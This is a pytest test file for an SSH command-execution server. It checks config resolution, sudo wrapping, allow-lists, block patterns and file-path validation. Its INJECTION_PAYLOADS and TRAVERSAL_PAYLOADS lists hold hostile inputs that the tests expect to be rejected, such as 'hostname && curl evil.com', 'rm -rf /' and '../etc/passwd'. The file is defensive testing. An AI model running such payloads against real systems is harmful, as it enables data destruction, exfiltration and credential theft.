"""Tests for server.py integration with the real production code.

These tests import and exercise the actual modules that server.py uses
(``server.main()`` argparse wiring, ``SudoHandler``, ``AuthorizationManager``,
``SSHClientManager``, ``FileTransferService``, ``RequestContextMiddleware``)
instead of reimplementing logic inline.  Only true I/O boundaries are mocked:
``paramiko.SSHClient``, ``server.create_app`` and ``asyncio.run``.
"""

import json
import os
import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

import server
from lib.auth import AuthorizationManager
from lib.constants import (
    DEFAULT_CONFIG_DIR,
    DEFAULT_LOG_DIR,
    DEFAULT_SSH_PORT,
    DEFAULT_SSH_TIMEOUT_SECONDS,
    SUDO_NO_PASSWORD_FLAG,
    SUDO_PASSWORD_PROMPT_FLAGS,
)
from lib.exceptions import FileTransferError
from lib.file_transfer import FileTransferService
from lib.request_context import RequestContextMiddleware
from lib.ssh_client import SSHClientManager
from lib.sudo import SudoHandler


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _write_config(config_dir: Path, data: dict) -> Path:
    """Write a config dict to ssh-mcp-config.json in the given directory."""
    config_dir.mkdir(parents=True, exist_ok=True)
    config_path = config_dir / "ssh-mcp-config.json"
    config_path.write_text(json.dumps(data))
    return config_path


def _make_minimal_config(**overrides) -> dict:
    """Return a minimal valid config dict, with optional overrides."""
    base = {
        "version": 1,
        "ssh_targets": {
            "testserver": {
                "host": "10.0.0.1",
                "username": "testuser",
                "port": 22,
                "password": "testpass",
            },
        },
        "block_patterns": [r"\brm\s+-rf\b", r"\bshutdown\b"],
        "allowed_commands": {
            "default": [
                {"targets": ["*"], "commands": ["hostname", "uptime", "df"]},
            ],
            "api_keys": [],
            "networks": [],
        },
        "settings": {
            "max_output_length": 50000,
            "command_timeout_max": 120,
        },
    }
    base.update(overrides)
    return base


def _make_config_manager(tmp_path: Path, config: dict):
    """Create a ConfigManager pointing to tmp_path with the given config.

    Returns the manager WITHOUT starting the watcher thread.
    """
    from lib.config import ConfigManager

    _write_config(tmp_path, config)
    mgr = ConfigManager(str(tmp_path))
    # load() already called in __init__; reload to ensure exact config
    mgr.reload()
    return mgr


def _password_target(**overrides) -> dict:
    """SSH target dict using password authentication."""
    target = {
        "host": "10.0.0.1",
        "username": "root",
        "auth": {"type": "password", "password": "secret"},
    }
    target.update(overrides)
    return target


def _key_target(**overrides) -> dict:
    """SSH target dict using key authentication."""
    target = {
        "host": "10.0.0.1",
        "username": "root",
        "auth": {"type": "key", "key_filename": "~/keys/id_ed25519"},
    }
    target.update(overrides)
    return target


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def config_manager(tmp_path):
    """A ConfigManager wired to a minimal, known config."""
    return _make_config_manager(tmp_path, _make_minimal_config())


@pytest.fixture
def auth_manager(config_manager):
    """An AuthorizationManager over the shared minimal config."""
    return AuthorizationManager(config_manager)


# ---------------------------------------------------------------------------
# main() config/log-dir resolution tests (real argparse wiring)
# ---------------------------------------------------------------------------


class TestResolveConfigDir:
    """Tests that server.main() resolves --config / CONFIG_DIR correctly."""

    @staticmethod
    def _run_main(monkeypatch, argv, env=None):
        """Run the real server.main() with create_app/asyncio mocked.

        Returns the kwargs server.main() passes to create_app().
        """
        captured = {}

        def fake_create_app(**kwargs):
            captured.update(kwargs)
            return MagicMock()

        monkeypatch.setattr(server, "create_app", fake_create_app)
        monkeypatch.setattr(server, "asyncio", MagicMock())
        monkeypatch.setattr(sys, "argv", argv)
        for key, value in (env or {}).items():
            monkeypatch.setenv(key, value)
        server.main()
        return captured

    def test_default(self, monkeypatch):
        """Uses DEFAULT_CONFIG_DIR when no env var or CLI arg is given."""
        monkeypatch.delenv("CONFIG_DIR", raising=False)
        captured = self._run_main(monkeypatch, ["server.py"])
        assert captured["config_dir"] == DEFAULT_CONFIG_DIR

    def test_env_var(self, monkeypatch):
        """Respects the CONFIG_DIR env var as the default."""
        captured = self._run_main(
            monkeypatch, ["server.py"], env={"CONFIG_DIR": "/custom/config/path"}
        )
        assert captured["config_dir"] == "/custom/config/path"

    def test_cli_arg(self, monkeypatch):
        """Respects the --config CLI arg."""
        monkeypatch.delenv("CONFIG_DIR", raising=False)
        captured = self._run_main(
            monkeypatch, ["server.py", "--config", "/cli/config/path"]
        )
        assert captured["config_dir"] == "/cli/config/path"

    def test_cli_arg_overrides_env(self, monkeypatch):
        """The --config CLI arg takes precedence over CONFIG_DIR."""
        captured = self._run_main(
            monkeypatch,
            ["server.py", "--config", "/cli/path"],
            env={"CONFIG_DIR": "/env/path"},
        )
        assert captured["config_dir"] == "/cli/path"


class TestResolveLogDir:
    """Tests that server.main() resolves --log-dir / LOG_DIR correctly."""

    @staticmethod
    def _run_main(monkeypatch, argv, env=None):
        """Run the real server.main() with create_app/asyncio mocked."""
        captured = {}

        def fake_create_app(**kwargs):
            captured.update(kwargs)
            return MagicMock()

        monkeypatch.setattr(server, "create_app", fake_create_app)
        monkeypatch.setattr(server, "asyncio", MagicMock())
        monkeypatch.setattr(sys, "argv", argv)
        for key, value in (env or {}).items():
            monkeypatch.setenv(key, value)
        server.main()
        return captured

    def test_default(self, monkeypatch):
        """Uses DEFAULT_LOG_DIR when no env var or CLI arg is given."""
        monkeypatch.delenv("LOG_DIR", raising=False)
        captured = self._run_main(monkeypatch, ["server.py"])
        assert captured["log_dir"] == DEFAULT_LOG_DIR

    def test_env_var(self, monkeypatch):
        """Respects the LOG_DIR env var as the default."""
        captured = self._run_main(
            monkeypatch, ["server.py"], env={"LOG_DIR": "/custom/log/path"}
        )
        assert captured["log_dir"] == "/custom/log/path"

    def test_cli_arg(self, monkeypatch):
        """Respects the --log-dir CLI arg."""
        monkeypatch.delenv("LOG_DIR", raising=False)
        captured = self._run_main(
            monkeypatch, ["server.py", "--log-dir", "/cli/log/path"]
        )
        assert captured["log_dir"] == "/cli/log/path"

    def test_cli_arg_overrides_env(self, monkeypatch):
        """The --log-dir CLI arg takes precedence over LOG_DIR."""
        captured = self._run_main(
            monkeypatch,
            ["server.py", "--log-dir", "/cli/path"],
            env={"LOG_DIR": "/env/path"},
        )
        assert captured["log_dir"] == "/cli/path"


# ---------------------------------------------------------------------------
# Client-IP extraction tests (real RequestContextMiddleware)
# ---------------------------------------------------------------------------


class TestExtractClientIP:
    """Tests for RequestContextMiddleware._extract_ip()."""

    @staticmethod
    def _make_request(headers=None, client_host=None):
        request = MagicMock()
        request.headers.get = lambda name, default="": (headers or {}).get(name, default)
        if client_host is None:
            request.client = None
        else:
            request.client = MagicMock()
            request.client.host = client_host
        return request

    def test_uses_leftmost_forwarded_for(self):
        """X-Forwarded-For leftmost entry is the original client."""
        request = self._make_request(
            headers={"X-Forwarded-For": "203.0.113.9, 10.0.0.1"},
            client_host="10.0.0.1",
        )
        assert RequestContextMiddleware._extract_ip(request) == "203.0.113.9"

    def test_falls_back_to_client_host(self):
        """Without X-Forwarded-For, the direct client host is used."""
        request = self._make_request(headers={}, client_host="192.168.1.5")
        assert RequestContextMiddleware._extract_ip(request) == "192.168.1.5"

    def test_invalid_forwarded_for_falls_back_to_loopback(self):
        """Invalid X-Forwarded-For values are replaced with 127.0.0.1."""
        request = self._make_request(
            headers={"X-Forwarded-For": "not-an-ip"}, client_host="10.0.0.1"
        )
        assert RequestContextMiddleware._extract_ip(request) == "127.0.0.1"

    def test_no_client_returns_loopback(self):
        """A request without client info falls back to 127.0.0.1."""
        request = self._make_request(headers={}, client_host=None)
        assert RequestContextMiddleware._extract_ip(request) == "127.0.0.1"


# ---------------------------------------------------------------------------
# Sudo tests (real SudoHandler)
# ---------------------------------------------------------------------------


class TestIsCommandSudo:
    """Tests for SudoHandler.is_sudo_command()."""

    def test_plain_command(self):
        """A command without sudo is not a sudo command."""
        assert SudoHandler.is_sudo_command("hostname") is False

    def test_sudo_prefix(self):
        """'sudo ...' is detected."""
        assert SudoHandler.is_sudo_command("sudo whoami") is True

    def test_sudo_mid_command(self):
        """sudo appearing mid-command is still detected."""
        assert SudoHandler.is_sudo_command("echo hi && sudo whoami") is True

    def test_case_insensitive(self):
        """Detection is case-insensitive."""
        assert SudoHandler.is_sudo_command("SUDO whoami") is True

    def test_word_boundary(self):
        """Words like 'sudoku' must not trigger the match."""
        assert SudoHandler.is_sudo_command("sudoku") is False


class TestSudoValidation:
    """Tests for SudoHandler.validate_sudo()."""

    def test_rejects_sudo_in_command_when_sudo_true(self):
        """sudo=True with 'sudo whoami' returns an error message."""
        error = SudoHandler.validate_sudo("sudo whoami", sudo=True)
        assert error is not None
        assert "ERROR" in error

    def test_allows_normal_command_when_sudo_true(self):
        """sudo=True with 'whoami' passes validation."""
        assert SudoHandler.validate_sudo("whoami", sudo=True) is None

    def test_allows_sudo_in_command_when_sudo_false(self):
        """sudo=False with 'sudo whoami' passes validation (block_patterns handle it)."""
        assert SudoHandler.validate_sudo("sudo whoami", sudo=False) is None

    def test_case_insensitive_sudo_rejection(self):
        """sudo=True with 'SUDO whoami' is rejected (case-insensitive)."""
        assert SudoHandler.validate_sudo("SUDO whoami", sudo=True) is not None


class TestSudoCommandWrapping:
    """Tests for SudoHandler.wrap_sudo_command() (returns a plain string)."""

    def test_wrap_with_password(self):
        """sudo=True with a password uses 'sudo -S -p '''."""
        wrapped = SudoHandler.wrap_sudo_command("whoami", True, "secret")
        assert wrapped == f"{SUDO_PASSWORD_PROMPT_FLAGS} whoami"

    def test_wrap_without_password(self):
        """sudo=True without a password uses 'sudo -n'."""
        wrapped = SudoHandler.wrap_sudo_command("whoami", True, None)
        assert wrapped == f"{SUDO_NO_PASSWORD_FLAG} whoami"

    def test_no_wrap_when_sudo_false(self):
        """sudo=False leaves the command unchanged."""
        assert SudoHandler.wrap_sudo_command("whoami", False, "secret") == "whoami"

    def test_wrap_complex_command(self):
        """Wrapping works with piped commands."""
        wrapped = SudoHandler.wrap_sudo_command(
            "grep error /var/log/syslog | head -20", True, "secret"
        )
        assert wrapped == f"{SUDO_PASSWORD_PROMPT_FLAGS} grep error /var/log/syslog | head -20"


# ---------------------------------------------------------------------------
# block_patterns tests (real AuthorizationManager)
# ---------------------------------------------------------------------------


class TestCheckBlockPatterns:
    """Tests for block-pattern enforcement via AuthorizationManager."""

    def test_blocks_matching(self, tmp_path):
        """Commands matching a configured block pattern are denied."""
        config = _make_minimal_config(block_patterns=[r"\bshutdown\b"])
        auth = AuthorizationManager(_make_config_manager(tmp_path, config))

        result = auth.check_command("sudo shutdown now", "testserver", "127.0.0.1")
        assert result.allowed is False
        assert "blocked" in (result.matched_via or "")
        assert auth.check_command("hostname", "testserver", "127.0.0.1").allowed is True

    def test_allows_non_matching(self, auth_manager):
        """Commands that match no pattern and are allow-listed pass."""
        assert auth_manager.check_command("hostname", "testserver", "127.0.0.1").allowed is True
        assert auth_manager.check_command("df -h", "testserver", "127.0.0.1").allowed is True

    def test_case_insensitive_match(self, tmp_path):
        """Block patterns match case-insensitively."""
        config = _make_minimal_config(block_patterns=[r"\brm\s+-rf\b"])
        auth = AuthorizationManager(_make_config_manager(tmp_path, config))
        result = auth.check_command("RM -RF /", "testserver", "127.0.0.1")
        assert result.allowed is False

    def test_blocks_sudo(self, tmp_path):
        """Blocking 'sudo' forces callers to use the sudo=True parameter."""
        config = _make_minimal_config(block_patterns=[r"\bsudo\b"])
        auth = AuthorizationManager(_make_config_manager(tmp_path, config))

        assert auth.check_command(
            "sudo systemctl restart nginx", "testserver", "127.0.0.1"
        ).allowed is False
        # 'systemctl' is not blocked by the sudo pattern — it is only
        # denied because it is not in the allow list.
        denied = auth.check_command("systemctl restart nginx", "testserver", "127.0.0.1")
        assert denied.allowed is False
        assert "blocked" not in (denied.matched_via or "")
        # Case-insensitive
        assert auth.check_command(
            "SUDO systemctl restart nginx", "testserver", "127.0.0.1"
        ).allowed is False

    def test_blocks_sudo_command(self, tmp_path):
        """'sudo whoami' is blocked when \\bsudo\\b is a block pattern."""
        config = _make_minimal_config(
            block_patterns=[r"\bsudo\b"],
            allowed_commands={
                "default": [{"targets": ["*"], "commands": ["whoami"]}],
                "api_keys": [],
                "networks": [],
            },
        )
        auth = AuthorizationManager(_make_config_manager(tmp_path, config))
        result = auth.check_command("sudo whoami", "testserver", "127.0.0.1")
        assert result.allowed is False
        assert "blocked" in (result.matched_via or "")

    def test_sudo_in_default_block_patterns(self, tmp_path):
        """The configured block_patterns list is passed through as-is."""
        config = _make_minimal_config(
            block_patterns=[r"\bsudo\b", r"\brm\s+-rf\b", r"\bshutdown\b"]
        )
        mgr = _make_config_manager(tmp_path, config)
        assert mgr.data.get("block_patterns", [])[0] == r"\bsudo\b"


# ---------------------------------------------------------------------------
# is_command_allowed tests (real AuthorizationManager)
# ---------------------------------------------------------------------------


class TestIsCommandAllowed:
    """Tests for command allow-listing via AuthorizationManager."""

    def test_allows_in_rules(self, auth_manager):
        """Commands matching the default rules are allowed."""
        assert auth_manager.check_command("hostname", "testserver", "127.0.0.1").allowed is True
        assert auth_manager.check_command("uptime", "testserver", "127.0.0.1").allowed is True
        assert auth_manager.check_command("df -h", "testserver", "127.0.0.1").allowed is True

    def test_denies_not_in_rules(self, auth_manager):
        """Commands not in any rule are denied."""
        assert auth_manager.check_command("rm", "testserver", "127.0.0.1").allowed is False
        assert auth_manager.check_command("curl", "testserver", "127.0.0.1").allowed is False

    def test_respects_target_filter(self, tmp_path):
        """Only commands for servers matching the targets filter are allowed."""
        config = _make_minimal_config(
            ssh_targets={
                "server-a": {"host": "10.0.0.1", "username": "u", "password": "p"},
                "server-b": {"host": "10.0.0.2", "username": "u", "password": "p"},
            },
            allowed_commands={
                "default": [
                    {"targets": ["server-a"], "commands": ["hostname"]},
                    {"targets": ["server-b"], "commands": ["uptime"]},
                ],
                "api_keys": [],
                "networks": [],
            },
        )
        auth = AuthorizationManager(_make_config_manager(tmp_path, config))

        assert auth.check_command("hostname", "server-a", "127.0.0.1").allowed is True
        assert auth.check_command("uptime", "server-a", "127.0.0.1").allowed is False
        assert auth.check_command("uptime", "server-b", "127.0.0.1").allowed is True
        assert auth.check_command("hostname", "server-b", "127.0.0.1").allowed is False

    def test_wildcard_commands(self, tmp_path):
        """Wildcard '*' in commands allows anything, but block_patterns still apply."""
        config = _make_minimal_config(
            allowed_commands={
                "default": [{"targets": ["*"], "commands": ["*"]}],
                "api_keys": [],
                "networks": [],
            },
        )
        auth = AuthorizationManager(_make_config_manager(tmp_path, config))

        assert auth.check_command("anything", "testserver", "127.0.0.1").allowed is True
        # Block patterns still deny dangerous commands even with a wildcard.
        assert auth.check_command("rm -rf /", "testserver", "127.0.0.1").allowed is False
        assert auth.check_command("shutdown -h now", "testserver", "127.0.0.1").allowed is False


# ---------------------------------------------------------------------------
# get_ssh_client tests
# ---------------------------------------------------------------------------


class TestGetSshClient:
    """Tests for get_ssh_target target lookup logic."""

    def test_unknown_server_raises(self, tmp_path):
        """Raises ValueError for unknown server, listing available servers."""
        config = _make_minimal_config(
            ssh_targets={
                "myserver": {
                    "host": "10.0.0.1",
                    "username": "user",
                    "password": "pass",
                },
            },
        )
        mgr = _make_config_manager(tmp_path, config)

        target = mgr.get_ssh_target("nonexistent")
        assert target is None
        available = mgr.list_ssh_targets()
        assert "myserver" in available
        assert "nonexistent" not in available

    def test_known_server_returns_dict(self, tmp_path):
        """get_ssh_target returns a dict for a known server."""
        config = _make_minimal_config()
        mgr = _make_config_manager(tmp_path, config)

        target = mgr.get_ssh_target("testserver")
        assert target is not None
        assert target["host"] == "10.0.0.1"
        assert target["username"] == "testuser"
        assert target["port"] == 22


# ---------------------------------------------------------------------------
# ssh_list_servers tests
# ---------------------------------------------------------------------------


class TestSshListServers:
    """Tests for ssh_list_servers data retrieval."""

    def test_returns_targets(self, tmp_path):
        """Returns target IDs and their non-secret details from config."""
        config = _make_minimal_config(
            ssh_targets={
                "web": {"host": "10.0.0.1", "username": "admin", "password": "pw1"},
                "db": {"host": "10.0.0.2", "username": "root", "port": 2222, "password": "pw2"},
            },
        )
        mgr = _make_config_manager(tmp_path, config)

        targets = mgr.list_ssh_targets()
        result = {}
        for tid in targets:
            t = mgr.get_ssh_target(tid)
            result[tid] = {
                "host": t["host"],
                "port": t.get("port", 22),
                "username": t["username"],
            }

        assert "web" in result
        assert "db" in result
        assert result["web"]["host"] == "10.0.0.1"
        assert result["web"]["username"] == "admin"
        assert result["web"]["port"] == 22
        assert result["db"]["port"] == 2222
        # Secrets must not be leaked
        assert "password" not in result["web"]
        assert "private_key" not in result["web"]

    def test_returns_empty_for_no_targets(self, tmp_path):
        """Returns empty dict when config has no ssh_targets."""
        # ConfigManager requires non-empty ssh_targets, so the empty case
        # is exercised through the data pattern.
        config = _make_minimal_config()
        mgr = _make_config_manager(tmp_path, config)
        result = {tid: True for tid in mgr.list_ssh_targets() if tid not in mgr.data["ssh_targets"]}
        assert result == {}


# ---------------------------------------------------------------------------
# settings integration tests
# ---------------------------------------------------------------------------


class TestSettings:
    """Tests for settings access pattern."""

    def test_max_output_length_from_config(self, tmp_path):
        """max_output_length is read from config settings."""
        config = _make_minimal_config(
            settings={"max_output_length": 99999, "command_timeout_max": 60},
        )
        mgr = _make_config_manager(tmp_path, config)

        max_output = mgr.data.get("settings", {}).get("max_output_length", 50000)
        assert max_output == 99999

    def test_max_output_length_default(self, tmp_path):
        """Default max_output_length is 50000 when not in config."""
        config = _make_minimal_config()
        mgr = _make_config_manager(tmp_path, config)

        max_output = mgr.data.get("settings", {}).get("max_output_length", 50000)
        assert max_output == 50000

    def test_command_timeout_max(self, tmp_path):
        """command_timeout_max is read from config settings."""
        config = _make_minimal_config(
            settings={"max_output_length": 50000, "command_timeout_max": 30},
        )
        mgr = _make_config_manager(tmp_path, config)

        timeout_max = mgr.data.get("settings", {}).get("command_timeout_max", 120)
        assert timeout_max == 30


# ---------------------------------------------------------------------------
# get_ssh_client password tests
# ---------------------------------------------------------------------------


class TestGetSshClientPassword:
    """Tests for get_ssh_client target password extraction."""

    def test_returns_password(self, tmp_path):
        """When target has a password, get_ssh_target returns it."""
        config = _make_minimal_config(
            ssh_targets={
                "test-target": {
                    "host": "127.0.0.1",
                    "port": 22,
                    "username": "testuser",
                    "password": "secret123",
                }
            }
        )
        mgr = _make_config_manager(tmp_path, config)
        target = mgr.get_ssh_target("test-target")
        assert target["password"] == "secret123"

    def test_returns_without_password(self, tmp_path):
        """When target has no password, none is present."""
        config = _make_minimal_config(
            ssh_targets={
                "test-target": {
                    "host": "127.0.0.1",
                    "port": 22,
                    "username": "testuser",
                    "private_key": "/path/to/key",
                }
            }
        )
        mgr = _make_config_manager(tmp_path, config)
        target = mgr.get_ssh_target("test-target")
        assert target.get("password") is None
        assert target["private_key"] == "/path/to/key"


# ---------------------------------------------------------------------------
# SSH client creation tests (mock paramiko, real SSHClientManager)
# ---------------------------------------------------------------------------


class TestSSHClientCreation:
    """Tests for SSHClientManager.get_client().

    paramiko.SSHClient / AutoAddPolicy are mocked, but the manager's real
    target parsing, defaults, and auth dispatch are exercised.
    """

    def test_password_auth_connects(self):
        """Password auth passes password into connect() and returns the client."""
        with patch("lib.ssh_client.SSHClient") as mock_cls, patch(
            "lib.ssh_client.AutoAddPolicy"
        ):
            manager = SSHClientManager()
            client = manager.get_client(_password_target())

        assert client is mock_cls.return_value
        mock_cls.return_value.set_missing_host_key_policy.assert_called_once()
        mock_cls.return_value.connect.assert_called_once_with(
            hostname="10.0.0.1",
            port=DEFAULT_SSH_PORT,
            username="root",
            timeout=DEFAULT_SSH_TIMEOUT_SECONDS,
            password="secret",
        )

    def test_password_auth_custom_timeout(self):
        """The manager's timeout is forwarded to connect()."""
        with patch("lib.ssh_client.SSHClient") as mock_cls, patch(
            "lib.ssh_client.AutoAddPolicy"
        ):
            manager = SSHClientManager(default_timeout=45)
            manager.get_client(_password_target())

        mock_cls.return_value.connect.assert_called_once_with(
            hostname="10.0.0.1",
            port=DEFAULT_SSH_PORT,
            username="root",
            timeout=45,
            password="secret",
        )

    def test_key_auth_expands_home_and_passes_pkey(self):
        """Key auth expands '~' and passes the loaded pkey to connect()."""
        fake_pkey = MagicMock()
        with patch("lib.ssh_client.SSHClient") as mock_cls, patch(
            "lib.ssh_client.AutoAddPolicy"
        ), patch.object(
            SSHClientManager, "_load_ssh_key", return_value=fake_pkey
        ) as mock_load:
            manager = SSHClientManager()
            manager.get_client(_key_target())

        mock_load.assert_called_once_with(os.path.expanduser("~/keys/id_ed25519"))
        mock_cls.return_value.connect.assert_called_once_with(
            hostname="10.0.0.1",
            port=DEFAULT_SSH_PORT,
            username="root",
            timeout=DEFAULT_SSH_TIMEOUT_SECONDS,
            pkey=fake_pkey,
        )

    def test_default_port_used_when_missing(self):
        """Missing target port falls back to DEFAULT_SSH_PORT."""
        with patch("lib.ssh_client.SSHClient") as mock_cls, patch(
            "lib.ssh_client.AutoAddPolicy"
        ):
            manager = SSHClientManager()
            manager.get_client(_password_target())

        _, kwargs = mock_cls.return_value.connect.call_args
        assert kwargs["port"] == DEFAULT_SSH_PORT

    def test_unsupported_auth_type_raises_value_error(self):
        """An unsupported auth type raises ValueError."""
        with patch("lib.ssh_client.SSHClient"), patch("lib.ssh_client.AutoAddPolicy"):
            manager = SSHClientManager()
            with pytest.raises(ValueError, match="Unsupported auth type"):
                manager.get_client(
                    {
                        "host": "10.0.0.1",
                        "username": "root",
                        "auth": {"type": "agent"},
                    }
                )


# ---------------------------------------------------------------------------
# Command-injection tests (real AuthorizationManager, parametrized)
# ---------------------------------------------------------------------------

INJECTION_PAYLOADS = [
    # --- $() command substitution ---
    "$(whoami)",
    "echo $(whoami)",
    "ls$(whoami)",
    "hostname$(id)",
    # --- backtick substitution ---
    "`whoami`",
    "echo `whoami`",
    "ls`whoami`",
    # --- newline / carriage-return injection ---
    "ls\nrm -rf /",
    "hostname\nid",
    "ls\rwhoami",
    "hostname\r\nid",
    # --- chaining operators ---
    "hostname && curl evil.com",
    "hostname || curl evil.com",
    "hostname; curl evil.com",
    "hostname | curl evil.com",
    "hostname & curl evil.com",
    "hostname&&curl evil.com",
    "hostname||curl evil.com",
    # --- block-pattern commands ---
    "rm -rf /",
    "shutdown -h now",
    "sudo shutdown now",
    # --- nested / mixed payloads ---
    "$(hostname); $(id)",
    "echo `id` > /tmp/pwned",
    "hostname && $(rm -rf /)",
    "cat /etc/passwd | head -1; shutdown",
]


class TestCommandInjection:
    """Parametrized command-injection tests via the real AuthorizationManager."""

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_injection_rejected(self, payload, auth_manager):
        """Injection payloads must be denied, never executed."""
        result = auth_manager.check_command(payload, "testserver", "127.0.0.1")
        assert result.allowed is False, (
            f"Expected '{payload}' to be rejected, got: {result.reason}"
        )

    def test_block_pattern_metadata(self, auth_manager):
        """Blocked commands expose the matching pattern via matched_via."""
        result = auth_manager.check_command("rm -rf /", "testserver", "127.0.0.1")
        assert result.allowed is False
        assert "blocked:" in (result.matched_via or "")

    def test_safe_chained_commands_allowed(self, auth_manager):
        """Chained commands whose segments are all allowed pass."""
        result = auth_manager.check_command("hostname && uptime", "testserver", "127.0.0.1")
        assert result.allowed is True

    def test_unicode_fullwidth_pipe_allowed(self, auth_manager):
        """Fullwidth pipe (U+FF5C) is not a shell metachar — safe behavior."""
        result = auth_manager.check_command("hostname \uff5c uptime", "testserver", "127.0.0.1")
        assert result.allowed is True

    def test_unicode_fullwidth_dollar_allowed(self, auth_manager):
        """Fullwidth dollar (U+FF04) is not shell command substitution."""
        result = auth_manager.check_command("hostname \uff04(whoami)", "testserver", "127.0.0.1")
        assert result.allowed is True


# ---------------------------------------------------------------------------
# Path-traversal tests (real FileTransferService, parametrized)
# ---------------------------------------------------------------------------

TRAVERSAL_PAYLOADS = [
    "",                                    # empty path
    "relative/path",                       # not absolute
    "../etc/passwd",                       # parent traversal
    "/etc/../etc/passwd",                  # '..' component
    "/etc/./passwd",                       # '.' component
    "/home/user/..",                       # trailing '..'
    "/home/user/.",                        # trailing '.'
    "/%2e%2e/etc/passwd",                  # percent-encoded '..'
    "/etc/%2e%2e/passwd",                  # encoded '..' mid-path
    "/%2e%2e%2fetc%2fpasswd",              # fully encoded '../'
    "/etc/\x00passwd",                     # null byte
    "/etc/\u2215passwd",                   # division-slash homoglyph
    "/etc/\uff0fpasswd",                   # fullwidth-slash homoglyph
    "/~/etc/passwd",                       # tilde component
    "/home/~/passwd",                      # tilde mid-path
    "/a/b/c/../../../../etc/passwd",       # deep nesting
]


class TestPathTraversal:
    """Parametrized path-traversal tests against FileTransferService."""

    @pytest.mark.parametrize("remote_path", TRAVERSAL_PAYLOADS)
    def test_traversal_rejected(self, remote_path):
        """Traversal payloads must raise FileTransferError."""
        service = FileTransferService()
        with pytest.raises(FileTransferError):
            service._validate_path(remote_path)

    def test_valid_absolute_path_allowed(self):
        """A legitimate absolute path passes with the default '/' sandbox."""
        service = FileTransferService()
        assert service._validate_path("/etc/hosts") == "/etc/hosts"

    def test_path_inside_sandbox_allowed(self, tmp_path):
        """Paths inside a configured sandbox root are allowed."""
        service = FileTransferService(sandbox_root=str(tmp_path))
        allowed_path = str(tmp_path / "sub" / "file.txt")
        assert service._validate_path(allowed_path) == allowed_path

    def test_path_outside_sandbox_rejected(self, tmp_path):
        """Paths outside the sandbox root are rejected."""
        service = FileTransferService(sandbox_root=str(tmp_path))
        with pytest.raises(FileTransferError, match="outside the allowed sandbox"):
            service._validate_path("/etc/passwd")



# ---------------------------------------------------------------------------
# Authorization-bypass tests
# ---------------------------------------------------------------------------


class TestAuthorizationBypass:
    """Authorization-bypass attempts must all be rejected."""

    def test_embedded_sudo_with_sudo_true_rejected_by_validation(self):
        """sudo=True with 'sudo' embedded in the command fails validation."""
        error = SudoHandler.validate_sudo("sudo whoami", sudo=True)
        assert error is not None

    def test_embedded_sudo_blocked_by_pattern(self, tmp_path):
        """sudo=False with 'sudo whoami' is blocked by the \\bsudo\\b pattern."""
        config = _make_minimal_config(
            block_patterns=[r"\bsudo\b"],
            allowed_commands={
                "default": [{"targets": ["*"], "commands": ["whoami"]}],
                "api_keys": [],
                "networks": [],
            },
        )
        auth = AuthorizationManager(_make_config_manager(tmp_path, config))
        result = auth.check_command("sudo whoami", "testserver", "127.0.0.1")
        assert result.allowed is False

    def test_double_wrapping_prevented(self):
        """An already-wrapped command must not be wrapped again."""
        wrapped = SudoHandler.wrap_sudo_command("whoami", True, "secret")
        assert wrapped == f"{SUDO_PASSWORD_PROMPT_FLAGS} whoami"
        # Re-wrapping would nest sudo; validate_sudo rejects the wrapped form.
        assert SudoHandler.validate_sudo(wrapped, sudo=True) is not None

    def test_command_substitution_bypass_rejected(self, auth_manager):
        """Chained substitution is rejected via dangerous-patterns."""
        result = auth_manager.check_command("hostname; $(id)", "testserver", "127.0.0.1")
        assert result.allowed is False
        assert result.matched_via == "blocked:dangerous-patterns"

    def test_case_insensitive_block_bypass_rejected(self, tmp_path):
        """Uppercased block-pattern commands are still blocked."""
        config = _make_minimal_config(
            block_patterns=[r"\bRM\s+-RF\b", r"\bShutdown\b"],
        )
        auth = AuthorizationManager(_make_config_manager(tmp_path, config))
        assert auth.check_command("rm -rf /", "testserver", "127.0.0.1").allowed is False
        assert auth.check_command("SHUTDOWN -H NOW", "testserver", "127.0.0.1").allowed is False

    def test_unknown_target_denied(self, auth_manager):
        """Commands for unknown targets are denied outright."""
        result = auth_manager.check_command("hostname", "nope", "127.0.0.1")
        assert result.allowed is False
        assert "Unknown target" in result.reason


# ---------------------------------------------------------------------------
# Sudo authorization tests
# ---------------------------------------------------------------------------


class TestSudoAuthorization:
    """Tests that authorization always runs against the unwrapped command."""

    def test_auth_checks_unwrapped_command(self, tmp_path):
        """When sudo=True, auth checks the original command, not 'sudo -S -p ...'."""
        config = _make_minimal_config(
            allowed_commands={
                "default": [{"targets": ["*"], "commands": ["whoami"]}],
                "api_keys": [],
                "networks": [],
            },
            block_patterns=[r"\bsudo\b"],
        )
        mgr = _make_config_manager(tmp_path, config)
        auth_mgr = AuthorizationManager(mgr)

        # The unwrapped command 'whoami' should be allowed
        result = auth_mgr.check_command("whoami", "testserver", "127.0.0.1")
        assert result.allowed is True

        # But 'sudo whoami' is blocked by pattern
        result = auth_mgr.check_command("sudo whoami", "testserver", "127.0.0.1")
        assert result.allowed is False


# ---------------------------------------------------------------------------
# Module-level tests
# ---------------------------------------------------------------------------


def test_sudo_validation_before_auth():
    """When sudo=True with 'sudo whoami', validation rejects before auth runs."""
    command = "sudo whoami"
    sudo = True

    if SudoHandler.validate_sudo(command, sudo) is not None:
        result = "ERROR_VALIDATION"
    else:
        result = "AUTH_RAN"

    assert result == "ERROR_VALIDATION"
